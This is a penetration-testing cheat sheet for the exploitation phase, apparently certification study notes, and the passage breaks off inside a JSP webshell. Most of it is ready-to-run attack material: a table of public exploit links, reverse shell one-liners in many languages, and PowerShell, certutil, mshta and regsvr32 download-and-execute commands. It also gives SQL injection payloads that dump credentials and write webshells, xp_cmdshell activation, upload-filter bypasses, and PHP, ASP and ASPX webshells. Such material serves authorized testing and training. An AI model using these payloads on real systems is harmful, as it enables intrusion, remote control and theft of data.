# Exploitation (Infrastructure & Web)

## üéØ Goal

Transform enumeration findings into initial system access through methodical exploitation of identified vulnerabilities.

---

## Table of Contents

1. [Exploitation Path Selection](#31-exploitation-path-selection)
2. [Reverse Shell One-Liners](#32-reverse-shell-one-liners)
3. [Shell Stabilization and Upgrades](#33-shell-stabilization-and-upgrades)
4. [SQL Injection ‚Üí RCE](#34-sql-injection-rce)
5. [File Upload ‚Üí Webshell ‚Üí RCE](#35-file-upload-webshell-rce)
6. [LFI/RFI ‚Üí RCE Techniques](#36-lfirfi-rce-techniques)
7. [Advanced Web Attacks](#37-advanced-web-attacks)
8. [Authentication Bypass Techniques](#38-authentication-bypass-techniques)
9. [Buffer Overflow Exploitation](#39-buffer-overflow-exploitation)
10. [File Transfer Methods](#310-file-transfer-methods)
11. [SSH Key Exploitation](#311-ssh-key-exploitation)
12. [Documentation Standards](#312-documentation-standards)
13. [Common Exploitation Scenarios](#313-common-exploitation-scenarios)
14. [Troubleshooting Common Issues](#314-troubleshooting-common-issues)
15. [Quick Win Checks](#315-quick-win-checks)
16. [Post-Exploitation Readiness](#316-post-exploitation-readiness)
17. [Tool References](#317-tool-references)
18. [Success Criteria](#-success-criteria)

---

## üìã Phase Checklist

### üéØ 3.1 Pre-Exploitation Validation

- [ ] Chosen the¬†**cleanest / most reliable**¬†exploitation method ‚Üí¬†[3.1](#31-exploitation-path-selection)
- [ ] Considered noise level and detection probability ‚Üí¬†[3.1.1](#311-stealth-considerations)
- [ ] Vulnerability validated (version, PoC scan) before heavy exploitation ‚Üí¬†[3.1.2](#312-vulnerability-validation)

### üêö 3.2 Shell Management

- [ ] At least one¬†**reverse shell**¬†or command execution path confirmed ‚Üí¬†[3.2](#32-reverse-shell-one-liners)
- [ ] Listener setup completed ‚Üí¬†[3.2.1](#321-listener-setup)
- [ ] Immediate stabilization/upgrade performed ‚Üí¬†[3.3](#33-shell-stabilization-and-upgrades)

### üåê 3.3 Web Application Exploitation

- [ ] Manual SQL injection tested ‚Üí¬†[3.4](#34-sql-injection-rce)
- [ ] File upload bypass techniques attempted ‚Üí¬†[3.5](#35-file-upload-webshell-rce)
- [ ] LFI/RFI to RCE paths explored ‚Üí¬†[3.6](#36-lfirfi-rce-techniques)
- [ ] Advanced web attacks evaluated (XXE, SSRF, Deserialization) ‚Üí¬†[3.7 ](#37-advanced-web-attacks)

### üîì 3.4 Authentication & Session Attacks

- [ ] SQL injection login bypass attempted ‚Üí¬†[3.8](#38-authentication-bypass-techniques)
- [ ] JWT/Session manipulation tested ‚Üí¬†[3.8.2](#382-session-jwt-attacks)

### üí• 3.5 Buffer Overflow

- [ ] Fuzzing completed ‚Üí¬†[3.9](#39-buffer-overflow-exploitation)
- [ ] EIP control confirmed ‚Üí¬†[3.9.2](#392-eip-control)
- [ ] Bad characters identified ‚Üí¬†[3.9.3](#393-bad-character-identification)
- [ ] JMP ESP found ‚Üí¬†[3.9.4](#394-finding-jmp-esp)
- [ ] Shellcode generated and exploit working ‚Üí¬†[3.9.5](#395-final-exploit)

### üìÅ 3.6 File Transfer & Post-Exploitation Prep

- [ ] File transfer methods established ‚Üí¬†[3.10](#310-file-transfer-methods)
- [ ] SSH key exploitation attempted ‚Üí¬†[3.11](#311-ssh-key-exploitation)
- [ ] Exact exploitation steps documented for reporting ‚Üí¬†[3.12](#312-documentation-standards)

### üîß 3.7 Tool Usage Compliance

- [ ] Metasploit usage minimized (allowed on one machine only)
- [ ] Manual reproduction path understood for all exploits
- [ ] No prohibited automatic exploitation tools used (sqlmap auto-exploit, LinPEAS auto-exploit)

---

## Well Known CVEs


| CVE | Descritpion | URL |
| --- | --- | --- |
| CVE-2014-6271 | Shocker RCE | https://github.com/nccgroup/shocker |
| CVE-2014-6271 | Shellshock RCE PoC | https://github.com/zalalov/CVE-2014-6271 |
| CVE-2014-6271 | Shellshocker RCE POCs | https://github.com/mubix/shellshocker-pocs |
| CVE-2016-5195 | Dirty COW LPE | https://github.com/firefart/dirtycow |
| CVE-2016-5195 | Dirty COW '/proc/self/mem' Race Condition (/etc/passwd Method) LPE | https://www.exploit-db.com/exploits/40847 |
| CVE-2016-5195 | Dirty COW 'PTRACE_POKEDATA' Race Condition (/etc/passwd Method) LPE | https://www.exploit-db.com/exploits/40839 |
| CVE-2017-0144 | EternalBlue (MS17-010) RCE | https://github.com/d4t4s3c/Win7Blue |
| CVE-2017-0199 | RTF Dynamite RCE | https://github.com/bhdresh/CVE-2017-0199 |
| CVE-2018-7600 | Drupalgeddon 2 RCE | https://github.com/g0rx/CVE-2018-7600-Drupal-RCE |
| CVE-2018-10933 | libSSH Authentication Bypass | https://github.com/blacknbunny/CVE-2018-10933 |
| CVE-2018-16509 | Ghostscript PIL RCE | https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509 |
| CVE-2019-14287 | Sudo Bypass LPE | https://github.com/n0w4n/CVE-2019-14287 |
| CVE-2019-18634 | Sudo Buffer Overflow LPE | https://github.com/saleemrashid/sudo-cve-2019-18634 |
| CVE-2019-5736 | RunC Container Escape PoC | https://github.com/Frichetten/CVE-2019-5736-PoC |
| CVE-2019-6447 | ES File Explorer Open Port Arbitrary File Read | https://github.com/fs0c131y/ESFileExplorerOpenPortVuln |
| CVE-2019-7304 | dirty_sock LPE | https://github.com/initstring/dirty_sock |
| CVE-2020-0796 | SMBGhost RCE PoC | https://github.com/chompie1337/SMBGhost_RCE_PoC |
| CVE-2020-1472 | ZeroLogon PE Checker & Exploitation Code | https://github.com/VoidSec/CVE-2020-1472 |
| CVE-2020-1472 | ZeroLogon PE Exploitation Script | https://github.com/risksense/zerologon |
| CVE-2020-1472 | ZeroLogon PE PoC | https://github.com/dirkjanm/CVE-2020-1472 |
| CVE-2020-1472 | ZeroLogon PE Testing Script | https://github.com/SecuraBV/CVE-2020-1472 |
| CVE-2021-1675,CVE-2021-34527 | PrintNightmare LPE RCE | https://github.com/nemo-wq/PrintNightmare-CVE-2021-34527 |
| CVE-2021-1675 | PrintNightmare LPE RCE (PowerShell Implementation) | https://github.com/calebstewart/CVE-2021-1675 |
| CVE-2021-21972 | vCenter RCE | https://github.com/horizon3ai/CVE-2021-21972 |
| CVE-2021-22204 | ExifTool Command Injection RCE | https://github.com/AssassinUKG/CVE-2021-22204 |
| CVE-2021-22204 | GitLab ExifTool RCE | https://github.com/CsEnox/Gitlab-Exiftool-RCE |
| CVE-2021-22204 | GitLab ExifTool RCE (Python Implementation) | https://github.com/convisolabs/CVE-2021-22204-exiftool |
| CVE-2021-26085 | Confluence Server RCE | https://github.com/Phuong39/CVE-2021-26085 |
| CVE-2021-27928 | MariaDB/MySQL wsrep provider RCE | https://github.com/Al1ex/CVE-2021-27928 |
| CVE-2021-3129 | Laravel Framework RCE | https://github.com/nth347/CVE-2021-3129_exploit |
| CVE-2021-3156 | Sudo / sudoedit LPE  | https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit |
| CVE-2021-3156 | Sudo / sudoedit LPE PoC | https://github.com/blasty/CVE-2021-3156 |
| CVE-2021-3493 | OverlayFS Ubuntu Kernel Exploit LPE | https://github.com/briskets/CVE-2021-3493 |
| CVE-2021-3560 | polkit LPE (C Implementation) | https://github.com/hakivvi/CVE-2021-3560 |
| CVE-2021-3560 | polkit LPE | https://github.com/Almorabea/Polkit-exploit |
| CVE-2021-3560 | polkit LPE PoC | https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation |
| CVE-2021-36934 | HiveNightmare LPE | https://github.com/GossiTheDog/HiveNightmare |
| CVE-2021-36942 | PetitPotam | https://github.com/topotam/PetitPotam |
| CVE-2021-36942 | DFSCoerce | https://github.com/Wh04m1001/DFSCoerce |
| CVE-2021-4034 | PwnKit Pkexec Self-contained Exploit LPE | https://github.com/ly4k/PwnKit |
| CVE-2021-4034 | PwnKit Pkexec LPE PoC (1) | https://github.com/dzonerzy/poc-cve-2021-4034 |
| CVE-2021-4034 | PwnKit Pkexec LPE PoC (2) | https://github.com/arthepsy/CVE-2021-4034 |
| CVE-2021-4034 | PwnKit Pkexec LPE PoC (3) | https://github.com/nikaiw/CVE-2021-4034 |
| CVE-2021-41379 | InstallerFileTakeOver LPE (0-day) (Archive) | https://github.com/klinix5/InstallerFileTakeOver |
| CVE-2021-41379 | InstallerFileTakeOver LPE (0-day) (Fork) | https://github.com/waltlin/CVE-2021-41379-With-Public-Exploit-Lets-You-Become-An-Admin-InstallerFileTakeOver |
| CVE-2021-41773,CVE-2021-42013, CVE-2020-17519 | Simples Apache Path Traversal (0-day) | https://github.com/MrCl0wnLab/SimplesApachePathTraversal |
| CVE-2021-42278,CVE-2021-42287 | sam-the-admin, sAMAccountName Spoofing / Domain Admin Impersonation PE | https://github.com/WazeHell/sam-the-admin |
| CVE-2021-42278 | sam-the-admin, sAMAccountName Spoofing / Domain Admin Impersonation PE (Python Implementation) | https://github.com/ly4k/Pachine |
| CVE-2021-42287,CVE-2021-42278 | noPac LPE (1) | https://github.com/cube0x0/noPac |
| CVE-2021-42287,CVE-2021-42278 | noPac LPE (2) | https://github.com/Ridter/noPac |
| CVE-2021-42321 | Microsoft Exchange Server RCE | https://gist.github.com/testanull/0188c1ae847f37a70fe536123d14f398 |
| CVE-2021-44228 | Log4Shell RCE (0-day) | https://github.com/kozmer/log4j-shell-poc |
| CVE-2021-44228 | Log4Shell RCE (0-day) | https://github.com/welk1n/JNDI-Injection-Exploit |
| CVE-2022-0847 | DirtyPipe-Exploit LPE | https://github.com/n3rada/DirtyPipe |
| CVE-2022-0847 | DirtyPipe-Exploits LPE | https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits |
| CVE-2022-21999 | SpoolFool, Windows Print Spooler LPE | https://github.com/ly4k/SpoolFool |
| CVE-2022-22963 | Spring4Shell RCE (0-day) | https://github.com/tweedge/springcore-0day-en |
| CVE-2022-23119,CVE-2022-23120 | Trend Micro Deep Security Agent for Linux Arbitrary File Read | https://github.com/modzero/MZ-21-02-Trendmicro |
| CVE-2022-24715 | Icinga Web 2 Authenticated Remote Code Execution RCE | https://github.com/JacobEbben/CVE-2022-24715 |
| CVE-2022-26134 | ConfluentPwn RCE (0-day) | https://github.com/redhuntlabs/ConfluentPwn |
| CVE-2022-31214 | Firejail / Firejoin LPE | https://seclists.org/oss-sec/2022/q2/188 |
| CVE-2022-31214 | Firejail / Firejoin LPE | https://www.openwall.com/lists/oss-security/2022/06/08/10 |
| CVE-2022-34918 | Netfilter Kernel Exploit LPE | https://github.com/randorisec/CVE-2022-34918-LPE-PoC |
| CVE-2022-46169 | Cacti Authentication Bypass RCE | https://github.com/ariyaadinatha/cacti-cve-2022-46169-exploit |
| CVE-2023-20598 | PDFWKRNL Kernel Driver LPE | https://github.com/H4rk3nz0/CVE-2023-20598-PDFWKRNL |
| CVE-2023-21746 | Windows NTLM EoP LocalPotato LPE | https://github.com/decoder-it/LocalPotato |
| CVE-2023-21768 | Windows Ancillary Function Driver for WinSock LPE POC | https://github.com/chompie1337/Windows_LPE_AFD_CVE-2023-21768 |
| CVE-2023-21817 | Kerberos Unlock LPE PoC | https://gist.github.com/monoxgas/f615514fb51ebb55a7229f3cf79cf95b |
| CVE-2023-22809 | sudoedit LPE | https://github.com/n3m1dotsys/CVE-2023-22809-sudoedit-privesc |
| CVE-2023-23752 | Joomla Unauthenticated Information Disclosure | https://github.com/Acceis/exploit-CVE-2023-23752 |
| CVE-2023-25690 | Apache mod_proxy HTTP Request Smuggling PoC | https://github.com/dhmosfunk/CVE-2023-25690-POC |
| CVE-2023-28879 | Shell in the Ghost: Ghostscript RCE PoC | https://github.com/AlmondOffSec/PoCs/tree/master/Ghostscript_rce |
| CVE-2023-32233 | Use-After-Free in Netfilter nf_tables LPE | https://github.com/Liuk3r/CVE-2023-32233 |
| CVE-2023-32629, CVE-2023-2640 | GameOverlay Ubuntu Kernel Exploit LPE (0-day) | https://twitter.com/liadeliyahu/status/1684841527959273472?s=09 |
| CVE-2023-36874 | Windows Error Reporting Service LPE (0-day) | https://github.com/Wh04m1001/CVE-2023-36874 |
| CVE-2023-51467, CVE-2023-49070 | Apache OFBiz Authentication Bypass | https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass |
| CVE-2023-7028 | GitLab Account Takeover | https://github.com/V1lu0/CVE-2023-7028 |
| CVE-2023-7028 | GitLab Account Takeover | https://github.com/Vozec/CVE-2023-7028 |
| CVE-2024-0582 | Ubuntu Linux Kernel io_uring LPE | https://github.com/ysanatomic/io_uring_LPE-CVE-2024-0582 |
| CVE-2024-1086 | Use-After-Free Linux Kernel Netfilter nf_tables LPE | https://github.com/Notselwyn/CVE-2024-1086 |
| CVE-2024-4577 | PHP-CGI Argument Injection Vulnerability RCE | https://github.com/watchtowrlabs/CVE-2024-4577 |
| CVE-2024-30088 | Microsoft Windows LPE | https://github.com/tykawaii98/CVE-2024-30088 |
| CVE-2024-49138 | Windows Common Log File System Driver LPE | https://github.com/MrAle98/CVE-2024-49138-POC |
| CVE-2025-24071 | Windows File Explorer Spoofing Vulnerability (1) | https://github.com/ThemeHackers/CVE-2025-24071 |
| CVE-2025-24071 | Windows File Explorer Spoofing Vulnerability (2) | https://github.com/0x6rss/CVE-2025-24071_PoC |
| CVE-2025-24813 | Apache Tomcat Deserialization RCE (1) | https://github.com/iSee857/CVE-2025-24813-PoC |
| CVE-2025-24813 | Apache Tomcat Deserialization RCE (2) | https://github.com/absholi7ly/POC-CVE-2025-24813 |
| CVE-2025-29927 | Next.js Authentication Bypass | https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware |
| CVE-2025-30397 | Windows Server 2025 Use-After-Free in JScript.dll (RCE) | https://github.com/mbanyamer/CVE-2025-30397---Windows-Server-2025-JScript-RCE-Use-After-Free- |
| CVE-2025-32463 | chwoot sudo LPE | https://github.com/pr0v3rbs/CVE-2025-32463_chwoot |
| CVE-2025-62215 | Windows Kernel LPE | https://github.com/dexterm300/CVE-2025-62215-exploit-poc |
| CVE-2025-9074 | Docker Desktop (Windows) Container Escape - Host Write via Exposed Engine API | https://github.com/zenzue/CVE-2025-9074 |
| n/a | BadSuccessor LPE | https://github.com/ibaiC/BadSuccessor |
| n/a | dompdf RCE (0-day) | https://github.com/positive-security/dompdf-rce |
| n/a | dompdf XSS to RCE (0-day) | https://positive.security/blog/dompdf-rce |
| n/a | StorSvc LPE | https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc |
| n/a | ADCSCoercePotato | https://github.com/decoder-it/ADCSCoercePotato |
| n/a | CoercedPotato LPE | https://github.com/Prepouce/CoercedPotato |
| n/a | DCOMPotato LPE | https://github.com/zcgonvh/DCOMPotato |
| n/a | DeadPotato LPE | https://github.com/lypd0/DeadPotato |
| n/a | GenericPotato LPE | https://github.com/micahvandeusen/GenericPotato |
| n/a | GodPotato LPE | https://github.com/BeichenDream/GodPotato |
| n/a | JuicyPotato LPE | https://github.com/ohpe/juicy-potato |
| n/a | Juice-PotatoNG LPE | https://github.com/antonioCoco/JuicyPotatoNG |
| n/a | MultiPotato LPE | https://github.com/S3cur3Th1sSh1t/MultiPotato |
| n/a | RemotePotato0 PE | https://github.com/antonioCoco/RemotePotato0 |
| n/a | RoguePotato LPE | https://github.com/antonioCoco/RoguePotato |
| n/a | RottenPotatoNG LPE | https://github.com/breenmachine/RottenPotatoNG |
| n/a | RustPotato LPE | https://github.com/safedv/RustPotato |
| n/a | SharpEfsPotato LPE | https://github.com/bugch3ck/SharpEfsPotato |
| n/a | SigmaPotato LPE | https://github.com/tylerdotrar/SigmaPotato |
| n/a | SweetPotato LPE | https://github.com/CCob/SweetPotato |
| n/a | SweetPotato LPE | https://github.com/uknowsec/SweetPotato |
| n/a | S4UTomato LPE | https://github.com/wh0amitz/S4UTomato |
| n/a | PrintSpoofer LPE (1) | https://github.com/dievus/printspoofer |
| n/a | PrintSpoofer LPE (2) | https://github.com/itm4n/PrintSpoofer |
| n/a | SharpSuccessor LPE | https://github.com/logangoins/SharpSuccessor |
| n/a | Shocker Container Escape | https://github.com/gabrtv/shocker |
| n/a | SystemNightmare PE | https://github.com/GossiTheDog/SystemNightmare |
| n/a | NoFilter LPE | https://github.com/deepinstinct/NoFilter |
| n/a | OfflineSAM LPE | https://github.com/gtworek/PSBits/tree/master/OfflineSAM |
| n/a | OfflineAddAdmin2 LPE | https://github.com/gtworek/PSBits/tree/master/OfflineSAM/OfflineAddAdmin2 |
| n/a | bin-sploits | https://gitlab.com/exploit-database/exploitdb-bin-sploits |
| n/a | Kernelhub | https://github.com/Ascotbe/Kernelhub |
| n/a | Windows Exploits | https://github.com/SecWiki/windows-kernel-exploits |
| n/a | Pre-compiled Windows Exploits | https://github.com/abatchy17/WindowsExploits |

---

## 3.1 Exploitation Path Selection

### 3.1.1 Stealth Considerations

**Prioritize exploitation methods by noise level:**

|Priority|Method|Noise Level|Detection Risk|
|---|---|---|---|
|1|SSH with credentials/keys|Very Low|Minimal|
|2|Web application exploits|Low-Medium|WAF/IDS alerts|
|3|Service-specific exploits|Medium|Service logs|
|4|Network-based exploits|High|IDS/SIEM alerts|

**Common ports for callbacks (evade firewalls):**

```bash
nc -lvp 443    # HTTPS - often allowed outbound
nc -lvp 80     # HTTP
nc -lvp 53     # DNS
nc -lvp 8080   # Alternative HTTP
```

### 3.1.2 Vulnerability Validation

**Before exploitation, always validate:**

```bash
# Check service version
nmap -sV -p <PORT> <RHOST>

# Search for known exploits
searchsploit <service_name> <version>
searchsploit -x <ID>     # examine exploit
searchsploit -m <ID>     # copy to current folder

# NSE scripts for vulnerability checking
locate .nse | grep <name>
nmap --script-help <name>
nmap --script vuln -p <PORT> <RHOST>
```

---

## 3.2 Reverse Shell One-Liners

**Quick Reference:**¬†[revshells.com](https://revshells.com/)

### Linux Payloads

```bash
# üêö Bash TCP
bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'

# üêö Bash UDP
bash -i >& /dev/udp/<LHOST>/<LPORT> 0>&1

# üêç Python (check version first)
python -c 'import socket,os,pty;s=socket.socket();s.connect(("<LHOST>",<LPORT>));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<LHOST>",<LPORT>));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'

# üêç Python (alternative)
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# üîß Netcat with -e (traditional)
nc <LHOST> <LPORT> -e /bin/bash
nc <LHOST> <LPORT> -e /bin/sh

# üåÄ Netcat without -e (OpenBSD)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f

# üîÑ Socat (most stable)
socat TCP:<LHOST>:<LPORT> EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# üíé Perl
perl -e 'use Socket;$i="<LHOST>";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# üíé Ruby
ruby -rsocket -e'f=TCPSocket.open("<LHOST>",<LPORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# ‚òï Java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<LHOST>/<LPORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

# üî∑ PHP
php -r '$sock=fsockopen("<LHOST>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("<LHOST>",<LPORT>);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'

# üìú AWK
awk 'BEGIN {s = "/inet/tcp/0/<LHOST>/<LPORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null

# üîÑ Exec redirect
exec 5<>/dev/tcp/<LHOST>/<LPORT> && cat <&5 | while read line; do $line 2>&5 >&5; done
0<&196;exec 196<>/dev/tcp/<LHOST>/<LPORT>; sh <&196 >&196 2>&196
```

### Windows Payloads

```powershell
# ‚ö° PowerShell (one-liner)
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# ‚ö° PowerShell (download and execute)
powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>:<LPORT>/Invoke-PowerShellTcp.ps1')"
powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://<LHOST>/shell.ps1'))"

# üîß PowerShell (Base64 encoded)
echo -n '/bin/bash -c "bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"' | base64
powershell -enc <BASE64_ENCODED_COMMAND>

# üñ•Ô∏è Netcat for Windows
nc.exe <LHOST> <LPORT> -e cmd.exe
nc.exe <LHOST> <LPORT> -e powershell.exe

# üîó Windows execution methods
certutil -urlcache -f http://<LHOST>/shell.exe shell.exe & shell.exe
mshta.exe http://<LHOST>:<LPORT>/shell.hta
rundll32.exe \\<LHOST>\share\test.dll,0
regsvr32 /s /n /u /i:http://<LHOST>:<LPORT>/shell.sct scrobj.dll
msiexec /q /i http://<LHOST>/shell.msi
```

### 3.2.1 Listener Setup

```bash
# üîç Netcat Listener (basic)
nc -nlvp <LPORT>

# üîç Netcat with rlwrap (arrow keys support)
rlwrap nc -nlvp <LPORT>

# üîç Socat Listener (stable)
socat file:`tty`,raw,echo=0 tcp-listen:<LPORT>

# üîç Ncat (SSL support)
ncat --ssl -lvp <LPORT>

# üéØ Metasploit Multi-Handler
msfconsole -q
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp
msf6 exploit(multi/handler) > set LHOST <LHOST>
msf6 exploit(multi/handler) > set LPORT <LPORT>
msf6 exploit(multi/handler) > run

# üéØ Metasploit (quick one-liner)
msfconsole -x "use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set lhost tun0; set lport <LPORT>; run -j"
```

---

## 3.3 Shell Stabilization and Upgrades

### Linux Shell Upgrade

```bash
# Step 1: Spawn PTY on target
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null

# Step 2: Background shell and configure terminal
# Press Ctrl+Z
stty raw -echo; fg
# Press Enter twice

# Step 3: Configure terminal environment
reset
export TERM=xterm
export SHELL=bash
stty rows 38 columns 116

# Get current terminal size on attacker
stty -a  # Note rows and columns

# Step 4: Alternative - Full socat upgrade
# On attacker:
socat file:`tty`,raw,echo=0 tcp-listen:<LPORT>

# On target:
socat tcp:<LHOST>:<LPORT> exec:bash,pty,stderr,setsid,sigint,sane

# Step 5: Alternative - Script method
SHELL=/bin/bash script -q /dev/null
```

### Windows Shell Upgrade

```powershell
# PowerShell to full console
powershell -nop -c "&{$w=(Get-Host).UI.RawUI;$b=$w.BufferSize;$b.Width=120;$b.Height=3000;$w.BufferSize=$b}"

# Spawn cmd.exe from PowerShell with proper size
cmd.exe /c "mode con: cols=120 lines=30"

# Upgrade shell to Meterpreter
# Generate payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell.exe

# Transfer and execute, catch with multi/handler
msf6 > use post/multi/manage/shell_to_meterpreter
```

---

## 3.4 SQL Injection ‚Üí RCE

### Manual SQL Injection Methodology

**Step 1: Identify Injection Point**

```bash
# Test characters
'
"
`
')
")
`)
'))
"))
`))

# Error-based detection
' OR '1'='1
' OR 1=1--
" OR ""="
' AND '1'='2
```

**Step 2: Determine Column Count**

```sql
-- ORDER BY method
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
-- Continue until error

-- UNION NULL method
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

**Step 3: Find Displayable Columns**

```sql
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```

**Step 4: Extract Database Information**

**MySQL:**

```sql
-- Version
' UNION SELECT @@version,NULL,NULL--

-- Current user
' UNION SELECT user(),NULL,NULL--

-- Database name
' UNION SELECT database(),NULL,NULL--

-- List databases
' UNION SELECT schema_name,NULL,NULL FROM information_schema.schemata--

-- List tables
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='<DB>'--

-- List columns
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='<TABLE>'--

-- Extract data
' UNION SELECT username,password,NULL FROM users--
```

**PostgreSQL:**

```sql
-- Version
' UNION SELECT version(),NULL,NULL--

-- Current user
' UNION SELECT current_user,NULL,NULL--

-- List databases
' UNION SELECT datname,NULL,NULL FROM pg_database--

-- List tables
' UNION SELECT tablename,NULL,NULL FROM pg_tables WHERE schemaname='public'--
```

**MSSQL:**

```sql
-- Version
' UNION SELECT @@version,NULL,NULL--

-- Current user
' UNION SELECT user_name(),NULL,NULL--

-- List databases
' UNION SELECT name,NULL,NULL FROM master.sys.databases--

-- List tables
' UNION SELECT name,NULL,NULL FROM <DB>.sys.tables--

-- Enable xp_cmdshell for RCE
EXEC sp_configure 'show advanced options', 1
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', 1
RECONFIGURE
EXEC xp_cmdshell 'whoami'
```

### SQL Injection ‚Üí File Operations ‚Üí RCE

**MySQL File Write (Webshell):**

```sql
-- Write webshell
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--
' UNION SELECT '<?php system($_GET["cmd"]); ?>',NULL,NULL INTO OUTFILE '/var/www/html/shell.php'--

-- File read
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--
```

**MSSQL Command Execution:**

```sql
-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Execute commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://<LHOST>/shell.ps1'')"';
```

### Time-Based Blind SQL Injection

```sql
-- MySQL
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
'; WAITFOR DELAY '0:0:5'--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--
'; IF (1=1) WAITFOR DELAY '0:0:5'--

-- PostgreSQL
'; SELECT pg_sleep(5)--
```

---

## 3.5 File Upload ‚Üí Webshell ‚Üí RCE

### Extension Bypass Techniques

```bash
# Double extensions
shell.php.jpg
shell.php.png
shell.php.gif

# Case manipulation
shell.pHp
shell.PhP
shell.PHP

# Null byte injection (older PHP)
shell.php%00.jpg
shell.php\x00.jpg

# Alternative extensions
shell.phtml
shell.php3
shell.php4
shell.php5
shell.php7
shell.phar
shell.phps
shell.pht

# Trailing characters
shell.php.
shell.php....
shell.php/
shell.php;.jpg

# Windows specific
shell.php::$DATA
shell.php:jpg
```

### Content-Type Bypass

```http
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
Content-Type: application/octet-stream
```

### Magic Bytes Bypass

```bash
# Add PNG magic bytes
echo -e '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>' > shell.png.php

# Add GIF magic bytes
echo -e 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif.php

# Add JPEG magic bytes
echo -e '\xFF\xD8\xFF\xE0<?php system($_GET["cmd"]); ?>' > shell.jpg.php

# Polyglot (valid image + PHP)
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg shell.php.jpg
```

### Webshell Examples

**PHP Webshells:**

```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php exec($_GET['cmd'], $output); print_r($output); ?>
<?php passthru($_GET['cmd']); ?>
<?php echo `$_GET['cmd']`; ?>

<!-- Reverse shell trigger -->
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"); ?>

<!-- More stealthy -->
<?php @eval($_POST['cmd']); ?>
```

**ASP Webshell:**

```asp
<%eval request("cmd")%>
```

**ASPX Webshell:**

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object s, EventArgs e) {
    ProcessStartInfo p = new ProcessStartInfo("cmd.exe", "/c " + Request["cmd"]);
    p.RedirectStandardOutput = true;
    p.UseShellExecute = false;
    Process pr = Process.Start(p);
    Response.Write(pr.StandardOutput.ReadToEnd());
}
</script>
```

**JSP Webshell:**

```jsp
<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
Process p = Runtime.getRuntime().exec(cmd);
